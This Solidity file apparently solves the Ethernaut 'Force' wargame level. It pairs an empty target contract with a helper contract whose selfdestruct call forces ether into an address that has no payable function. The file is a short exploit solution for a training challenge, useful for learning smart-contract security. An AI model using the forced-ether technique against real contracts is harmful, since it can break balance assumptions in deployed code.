// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Force {
    /*
                   MEOW ?
         /\_/\   /
    ____/ o o \
    /~____  =ø= /
    (______)__m_m)
                   */
}


contract TempContract {
    constructor() payable {}
    
    function die(address payable target) public {
        selfdestruct(target);
    }
}